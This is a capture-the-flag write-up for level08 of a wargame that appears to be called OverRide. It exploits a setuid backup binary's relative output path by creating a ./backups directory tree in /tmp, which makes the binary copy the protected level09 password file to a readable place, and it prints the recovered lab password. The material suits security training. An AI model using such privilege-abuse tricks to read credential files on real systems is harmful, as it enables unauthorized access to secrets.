Level08 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level08/level08
```

Level08 rights:
```Shell
level08@OverRide:~$ ls -la level08 
-rwsr-s---+ 1 level09 users 12975 Oct 19  2016 level08
```

Testing the binary:
```Shell
level08@OverRide:~$ ./level08 
Usage: ./level08 filename
ERROR: Failed to open (null)
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```
The program takes a file path as argument and makes a backup of its content. However, it can't create the backup because the directory doesn't exist.

We will create the directory that it need but in /tmp to have the right permission, executing the program in /tmp will use our newly directory to do the backup because the backup path is relative.

```Shell
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09/
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat /tmp/backups/home/users/level09/.pass 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```